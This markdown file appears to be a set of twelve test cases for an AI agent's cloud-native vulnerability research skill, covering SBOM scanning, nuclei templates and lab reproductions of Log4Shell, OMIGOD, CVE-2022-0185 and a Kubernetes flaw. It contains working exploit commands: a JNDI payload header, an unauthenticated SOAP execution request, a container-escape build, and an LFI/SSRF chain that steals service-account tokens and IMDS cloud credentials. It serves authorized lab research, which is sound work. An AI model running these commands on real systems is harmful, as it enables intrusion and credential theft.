# Cloud-Native Vulnerability Research Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, an isolated lab (Docker, kind, minikube, k3d, QEMU), or an authorized target. Never run active PoC reproduction or exploitation against production without explicit written authorization.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. SBOM & Vulnerability Scanning | 3 | LOW - MEDIUM |
| B. nuclei Template Authoring | 2 | MEDIUM - HIGH |
| C. Container & Library CVE Reproduction | 3 | HIGH - CRITICAL |
| D. Cloud Provider & k8s CVE Reproduction | 2 | CRITICAL |
| E. Patch Diff & Research Methodology | 1 | LOW - MEDIUM |
| F. KEV Tracking & Exploit Chain Composition | 1 | HIGH - CRITICAL |
| **Total** | **12** | **LOW - CRITICAL** |

---

## A. SBOM & Vulnerability Scanning

### TC-CV-001: SBOM Generation with syft

| Field | Value |
|------|-----|
| **ID** | TC-CV-001 |
| **Title** | Generate SPDX and CycloneDX SBOMs from a container image |
| **Objective** | Produce a complete, machine-readable SBOM (both SPDX JSON and CycloneDX JSON) from a target container image, validate the schema, and confirm that the SBOM captures all OS packages plus language-level dependencies. |
| **Steps** | 1. `syft myrepo/app:v1 -o spdx-json > sbom.spdx.json` and confirm the file exists.<br>2. `syft myrepo/app:v1 -o cyclonedx-json > sbom.cdx.json` and confirm the file exists.<br>3. `pyspdxtools --file sbom.spdx.json` to validate the SPDX schema (must exit 0).<br>4. `jq '.packages \| length' sbom.spdx.json` — compare against expected package count from the image's Dockerfile.<br>5. `jq '.components \| length' sbom.cdx.json` — CycloneDX count should be approximately equal (license fields differ).<br>6. Spot-check a known package: `jq '.packages[] \| select(.name=="log4j-core")' sbom.spdx.json`. |
| **Expected Result** | Both SBOM files exist, validate against their schemas, and contain the full package set including transitive language-level dependencies (e.g. log4j-core, spring-core). |
| **Tools** | syft, jq, spdx-tools |
| **MITRE** | T1068 (relevant to downstream patch prioritization) |
| **Difficulty** | LOW |
| **Tags** | sbom, syft, spdx, cyclonedx |

---

### TC-CV-002: Vulnerability Scan with trivy image

| Field | Value |
|------|-----|
| **ID** | TC-CV-002 |
| **Title** | Scan a container image for HIGH/CRITICAL vulnerabilities with trivy |
| **Objective** | Produce a JSON vulnerability report for the target image, filtered to HIGH/CRITICAL and only-fixed CVEs, suitable for downstream KEV/EPSS triage. |
| **Steps** | 1. `trivy image --severity HIGH,CRITICAL --only-fixed --format json --output trivy.json myrepo/app:v1`.<br>2. `jq '.Results[]?.Vulnerabilities[]? \| length' trivy.json` to count findings per target.<br>3. `jq -r '.Results[]?.Vulnerabilities[]? \| "\(.VulnerabilityID) \(.PkgName) \(.InstalledVersion) \(.FixedVersion)"' trivy.json \| sort -u` to produce the CVE list.<br>4. Cross-reference the CVE list against the CISA KEV catalog (download `known_exploited_vulnerabilities.json` and `comm -12`).<br>5. Pull EPSS for the top-5 CVEs via `curl 'https://api.first.org/data/v1/epss?cve=CVE-XXXX-YYYYY'`.<br>6. Document the triage matrix (KEV vs not, EPSS>0.5 vs not, network-exposed vs not). |
| **Expected Result** | A JSON report listing every HIGH/CRITICAL only-fixed CVE, a triage matrix that classifies each into patch-now / patch-7d / patch-30d / scheduled. |
| **Tools** | trivy, jq, curl, CISA KEV feed |
| **MITRE** | T1068, T1190 |
| **Difficulty** | LOW |
| **Tags** | trivy, vuln-scan, kev, epss, triage |

---

### TC-CV-003: Vulnerability Scan with grype against an SBOM

| Field | Value |
|------|-----|
| **ID** | TC-CV-003 |
| **Title** | Match an SBOM against NVD/OSV using grype and osv-scanner |
| **Objective** | Demonstrate independent SBOM-driven vuln scanning using both grype and osv-scanner; reconcile the two outputs into a single canonical CVE list. |
| **Steps** | 1. `grype sbom:sbom.spdx.json --severity high,critical --only-fixed -o json > grype.json`.<br>2. `osv-scanner --sbom=sbom.spdx.json --format=json > osv.json`.<br>3. Extract CVE IDs from each: `jq -r '.matches[].vulnerability.id' grype.json \| sort -u > grype.cves` and `jq -r '.results[].packages[].vulnerabilities[].id' osv.json \| sort -u > osv.cves`.<br>4. Compare: `comm -3 grype.cves osv.cves` — the symmetric difference is the reconciliation gap.<br>5. Investigate any gap (different feed freshness, package-name normalization) and document the cause.<br>6. Produce the canonical list: `comm -12 grype.cves osv.cves > reconciled.cves`. |
| **Expected Result** | Two independent JSON reports; a reconciled canonical CVE list that's the intersection of grype and osv-scanner findings; documented reasons for any divergence. |
| **Tools** | grype, osv-scanner, jq |
| **MITRE** | T1068 |
| **Difficulty** | LOW |
| **Tags** | grype, osv-scanner, sbom, reconciliation |

---

## B. nuclei Template Authoring

### TC-CV-004: nuclei Template Authoring + Local Validation

| Field | Value |
|------|-----|
| **ID** | TC-CV-004 |
| **Title** | Author and locally validate a nuclei template for a CVE |
| **Objective** | Write a YAML nuclei template that detects CVE-X (using CVE-2026-21858 Acme Web UI auth bypass as the worked example), validate it with `nuclei -validate`, run it against a known-vulnerable and known-patched target, and confirm true-positive + true-negative results. |
| **Steps** | 1. Create the template per `payloads.md §6` with required fields (`id`, `info`, `http`, `matchers`).<br>2. `nuclei -t my-templates/CVE-2026-21858.yaml -validate` — must exit 0 with no errors.<br>3. Spin up the vuln lab: `docker run -d --name vuln -p 8080:8080 vuln/acme:3.4.1`.<br>4. Spin up the patched lab: `docker run -d --name patched -p 8081:8080 vuln/acme:3.4.2`.<br>5. `nuclei -t my-templates/CVE-2026-21858.yaml -u http://127.0.0.1:8080` — must report 1 finding.<br>6. `nuclei -t my-templates/CVE-2026-21858.yaml -u http://127.0.0.1:8081` — must report 0 findings.<br>7. Capture `-debug -request-export /tmp/reqs.txt` output to document the matcher behavior. |
| **Expected Result** | Template validates; one finding on the vulnerable target; zero findings on the patched target; matcher behavior documented. |
| **Tools** | nuclei, Docker |
| **MITRE** | T1190 |
| **Difficulty** | MEDIUM |
| **Tags** | nuclei, template-authoring, validation |

---

### TC-CV-005: nuclei Template PR Workflow to projectdiscovery/nuclei-templates

| Field | Value |
|------|-----|
| **ID** | TC-CV-005 |
| **Title** | Open a PR to projectdiscovery/nuclei-templates |
| **Objective** | Fork, branch, place, validate, and open a pull request to the upstream projectdiscovery/nuclei-templates repository with the template authored in TC-CV-004. |
| **Steps** | 1. Fork the repo on GitHub (`gh repo fork projectdiscovery/nuclei-templates --clone`).<br>2. `git checkout -b add-CVE-2026-21858 upstream/main`.<br>3. `mkdir -p cves/2026 && cp my-templates/CVE-2026-21858.yaml cves/2026/`.<br>4. `nuclei -validate -t cves/2026/CVE-2026-21858.yaml` — must pass.<br>5. `git commit -m "add CVE-2026-21858 Acme Web UI auth bypass template"` and `git push -u origin add-CVE-2026-21858`.<br>6. `gh pr create --title "Add CVE-2026-21858 (Acme Web UI Auth Bypass)" --body "..."` with a description that documents validation against vuln+patched.<br>7. (Post-submit) Respond to maintainer review, tighten matchers if false positives are reported, push fixes to the same branch. |
| **Expected Result** | An open PR on projectdiscovery/nuclei-templates with a validated template, a clear description, and evidence of vuln+patched validation; (best case) merged by maintainers. |
| **Tools** | gh, git, nuclei |
| **MITRE** | T1190 |
| **Difficulty** | HIGH |
| **Tags** | nuclei, github, pr, contribution |

---

## C. Container & Library CVE Reproduction

### TC-CV-006: Log4Shell (CVE-2021-44228) Reproduction in a Container Lab

| Field | Value |
|------|-----|
| **ID** | TC-CV-006 |
| **Title** | Reproduce Log4Shell JNDI RCE in an isolated Docker lab |
| **Objective** | Stand up a vulnerable log4j-core 2.14.0 application, a malicious JNDI/LDAP server, and demonstrate remote code execution via the JNDI lookup vector, capturing forensic evidence. |
| **Steps** | 1. Verify isolation: `docker network create --internal lab-iso-net` and `docker run -d --name log4shell-lab --network lab-iso-net -p 127.0.0.1:8080:8080 ghcr.io/pojavzn/vulnlab-log4shell:2.14.0`.<br>2. Verify the app responds: `curl -s http://127.0.0.1:8080/ \| head`.<br>3. Stand up JNDIExploit: `cd JNDIExploit && java -jar JNDIExploit.jar -i 127.0.0.1 -p 1389 &`.<br>4. Build the RCE payload (base64-encoded `touch /tmp/pwned`): `echo -n 'touch /tmp/pwned' \| base64`.<br>5. Send the payload via header: `curl -sv -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/<B64>}' http://127.0.0.1:8080/`.<br>6. Verify execution: `docker exec log4shell-lab ls /tmp/pwned` (file exists).<br>7. Capture evidence: `docker logs log4shell-lab \| grep -i 'jndi'` and `docker exec log4shell-lab cat /tmp/pwned`.<br>8. Cleanup: `docker stop log4shell-lab && docker rm log4shell-lab`. |
| **Expected Result** | The file `/tmp/pwned` exists inside the container, proving JNDI lookup → LDAP → class loading → command execution. |
| **Tools** | Docker, curl, JNDIExploit, jq |
| **MITRE** | T1190 (Exploit Public-Facing App), T1059 (Command and Scripting) |
| **Difficulty** | MEDIUM |
| **Tags** | log4shell, jndi, rce, container-lab |

---

### TC-CV-007: OMIGOD (CVE-2021-38645) Reproduction

| Field | Value |
|------|-----|
| **ID** | TC-CV-007 |
| **Title** | Reproduce OMIGOD unauthenticated RCE against an Azure OMI lab VM |
| **Objective** | Demonstrate CVE-2021-38645 (Azure OMI HTTP listener unauth RCE on TCP 5985/5986) in a lab VM, capturing the SOAP request and the command execution result. |
| **Steps** | 1. Deploy a lab Azure VM (or local VM with OMI 1.6.8-1 installed) — never test against customer VMs.<br>2. Verify the listener: `nmap -p 5985,5986 --open <vm-ip>` — both ports should be open with the `HTTP` service banner.<br>3. Confirm OMI version: `scxadmin -version` (on the VM) returns 1.6.8 or earlier.<br>4. Construct the SOAP payload with `ExecuteShellCommand` and no auth header (per the published PoC).<br>5. `curl -sk -X POST http://<vm-ip>:5985/wsman -H 'Content-Type: application/soap+xml;charset=UTF-8' --data @omigod-payload.xml`.<br>6. Parse the SOAP response: the `<n:ExecuteShellCommand_OUTPUT>` element contains `<n:stdout>` with the command output.<br>7. Capture evidence (screenshots, SOAP exchange) and clean up by upgrading OMI to 1.6.8-2+ (`scxadmin -upgrade`). |
| **Expected Result** | Unauthenticated SOAP request returns a command-execution response with the requested command output, demonstrating CVE-2021-38645. |
| **Tools** | curl, nmap, OMI lab VM |
| **MITRE** | T1190, T1059 |
| **Difficulty** | HIGH |
| **Tags** | omigod, azure, unauth-rce, soap |

---

### TC-CV-008: CVE-2022-0185 Kernel Container Escape

| Field | Value |
|------|-----|
| **ID** | TC-CV-008 |
| **Title** | Reproduce CVE-2022-0185 (Linux kernel fs/context heap overflow) container escape |
| **Objective** | Demonstrate that a container with CAP_SYS_ADMIN on a vulnerable kernel (<5.16.5) can escape to the host. |
| **Steps** | 1. Boot a lab VM with kernel 5.13.x (Ubuntu 20.04 stock kernel meets the criteria).<br>2. `git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185 && cd CVE-2022-0185 && gcc -o exploit exploit.c`.<br>3. Launch the vuln container with CAP_SYS_ADMIN: `docker run --rm -it --security-opt systempaths=unconfined --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:20.04 bash`.<br>4. Inside the container: `./exploit` — observe that the shell becomes root (UID 0).<br>5. Verify host access: `ls -la /host/etc/shadow` (if hostPath is also mounted) or `cat /proc/1/root/etc/hostname` (if not).<br>6. Capture kernel logs: `dmesg \| grep legacy_parse_param` on the host.<br>7. Cleanup: rebuild the lab VM from a snapshot; upgrade the kernel to ≥5.16.11. |
| **Expected Result** | The exploit elevates the container's UID to 0 (host root); kernel log shows the overflow signature. |
| **Tools** | QEMU/lab VM, gcc, Docker |
| **MITRE** | T1068 (Exploitation for Privilege Escalation) |
| **Difficulty** | HIGH |
| **Tags** | kernel, container-escape, cve-2022-0185 |

---

## D. Cloud Provider & k8s CVE Reproduction

### TC-CV-009: CVE-2018-1002105 k8s API Server Reproduction

| Field | Value |
|------|-----|
| **ID** | TC-CV-009 |
| **Title** | Reproduce CVE-2018-1002105 (k8s API server HTTP/2 privilege escalation) |
| **Objective** | Stand up a vulnerable k8s cluster (v1.10.x via kind) and demonstrate the unauthenticated-to-cluster-admin escalation primitive (or document the limitation if the full PoC isn't available — in which case the test case becomes a defense-verification: confirm the patched version rejects the malformed HTTP/2 request). |
| **Steps** | 1. `kind create cluster --image kindest/node:v1.10.13 --name vuln-k8s`.<br>2. `kubectl version --short` — confirm server version 1.10.x.<br>3. Confirm anonymous auth baseline: `kubectl get --raw='/api/v1/namespaces/kube-system/secrets' --as=system:anonymous --v=8` — should return 403.<br>4. Send a malformed HTTP/2 request that triggers the privilege escalation (per published writeup): `curl -sk --http2 -H 'Content-Type: application/json' https://<api-server>/api/v1/namespaces/kube-system/secrets` — capture the response.<br>5. If a secrets list is returned, the CVE is reproduced; if 403/401, document the precise request that would have triggered it (the original PoC requires a crafted HTTP/2 stream reset).<br>6. (Defense verification) Tear down the vuln cluster and stand up a patched one (v1.11+): `kind create cluster --image kindest/node:v1.13.12 --name patched-k8s`; confirm the same request returns 403.<br>7. Cleanup: `kind delete cluster --name vuln-k8s && kind delete cluster --name patched-k8s`. |
| **Expected Result** | Either (a) the vuln cluster responds with secrets list (full PoC reproduced), or (b) the patched cluster correctly returns 403 and the vuln cluster shows anomalous behavior in audit logs (partial verification). |
| **Tools** | kind, kubectl, curl |
| **MITRE** | T1190, T1068 |
| **Difficulty** | HIGH |
| **Tags** | k8s, api-server, cve-2018-1002105, http2 |

---

### TC-CV-010: Patch Diff Analysis with BinDiff

| Field | Value |
|------|-----|
| **ID** | TC-CV-010 |
| **Title** | Diff a binary patch to extract the root-cause signature |
| **Objective** | Given vulnerable.so and patched.so (e.g. from a library that lacks source), use BinDiff (or Diaphora) to identify the changed function, extract a Yara/Suricata detection signature, and verify the signature against both versions. |
| **Steps** | 1. Disassemble vulnerable.so with Ghidra headless: `$GHIDRA_HOME/support/analyzeHeadless /tmp proj vuln -import vulnerable.so -postScript ExportBinExport.java`.<br>2. Repeat for patched.so.<br>3. Open both `.BinExport` files in BinDiff and run "Compare" — note functions with confidence < 0.7 (changed) and confidence = 1.0 but different content (likely the fix).<br>4. Identify the root-cause function (typically a single function with a small diff in basic block count).<br>5. Distill a Yara signature from the unique strings/control flow of the patched version: `rule CVE_2026_21858_Patched { strings: $fix = "X-Real-Ip" ascii; condition: $fix }`.<br>6. Validate: `yara sig.yar vulnerable.so` (no match) and `yara sig.yar patched.so` (match).<br>7. Document the root-cause analysis writeup. |
| **Expected Result** | A Yara signature that matches the patched binary and not the vulnerable binary; a one-paragraph root-cause summary derived from the diff. |
| **Tools** | Ghidra, BinDiff, Yara |
| **MITRE** | (research methodology — no direct MITRE mapping) |
| **Difficulty** | HIGH |
| **Tags** | bindiff, yara, patch-diff, methodology |

---

## E. Patch Diff & Research Methodology

### TC-CV-011: KEV Catalog Automation

| Field | Value |
|------|-----|
| **ID** | TC-CV-011 |
| **Title** | Automate daily KEV pull + cloud-native filter + SBOM match |
| **Objective** | Stand up a daily automation script that pulls the CISA KEV catalog, diffs against yesterday's snapshot, filters for cloud-native keywords, cross-references against the org's latest SBOM scan, and produces a triage report. |
| **Steps** | 1. Implement `kev-daily.sh` per `payloads.md §15.1` — daily curl of the KEV JSON, diff against yesterday, filter by keyword list.<br>2. For each new KEV addition, pull EPSS via `curl 'https://api.first.org/data/v1/epss?cve=<id>'`.<br>3. Cross-reference new KEV additions against the latest grype output: `comm -12 kev-new.txt our-cves.txt`.<br>4. Produce a Markdown report: new KEV additions, cloud-native filter hits, EPSS scores, any matches against the org's images.<br>5. Set up a cron job (or systemd timer) to run the script daily at 09:00 local.<br>6. Validate by simulating a new KEV addition (manually inject a test CVE into the JSON and confirm the script catches it). |
| **Expected Result** | A working daily automation script that produces a triage report; the report identifies any KEV additions that affect the org's images, with EPSS context. |
| **Tools** | bash, jq, curl, cron/systemd |
| **MITRE** | T1068 |
| **Difficulty** | MEDIUM |
| **Tags** | kev, automation, epss, daily-triage |

---

## F. KEV Tracking & Exploit Chain Composition

### TC-CV-012: Exploit Chain Composition (LFI + SSRF + IMDS + Container Escape)

| Field | Value |
|------|-----|
| **ID** | TC-CV-012 |
| **Title** | Compose a multi-CVE exploit chain for an end-to-end compromise narrative |
| **Objective** | Demonstrate how a single web-app LFI (or SSRF) primitive composes with cloud IMDSv1 weakness, k8s RBAC over-privilege, and a container-escape CVE (CVE-2022-0185) into a full end-to-end compromise narrative suitable for a red team report or executive briefing. |
| **Steps** | 1. Identify the chain entry point — e.g. an LFI in a Java web app running in a pod with a mounted SA token: `curl 'http://target.local/view?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token'`.<br>2. Exfil the SA token and replay it externally: `curl -sk -H "Authorization: Bearer <token>" https://<api-server>/api/v1/namespaces`.<br>3. Enumerate RBAC: `kubectl --token <token> --server <api> --insecure-skip-tls-verify auth can-i --list`.<br>4. Identify an SSRF primitive in another endpoint: `curl 'http://target.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'`.<br>5. Exfil cloud role credentials and call `aws sts get-caller-identity` from an attacker machine.<br>6. Pivot to EKS: `aws eks describe-cluster --name victim-prod` and capture the cluster endpoint.<br>7. If a pod can be created with CAP_SYS_ADMIN on a vulnerable kernel, exploit CVE-2022-0185 to escape to the node.<br>8. Document each step with timestamps, evidence (HTTP requests/responses, command outputs), and a Mermaid flow diagram.<br>9. Produce a remediation matrix: WAF rule for LFI/SSRF, IMDSv2 enforcement, RBAC least-privilege, kernel upgrade for CVE-2022-0185. |
| **Expected Result** | A documented exploit chain narrative covering web-app LFI → SA token exfil → API access → SSRF → IMDSv1 → cloud role → EKS → pod creation → CVE-2022-0185 escape → node root, with a remediation matrix. |
| **Tools** | curl, kubectl, aws-cli, jq, Mermaid |
| **MITRE** | T1190, T1068, T1210, T1552 (Unsecured Credentials) |
| **Difficulty** | CRITICAL |
| **Tags** | exploit-chain, lfi, ssrf, imds, container-escape, mermaid |
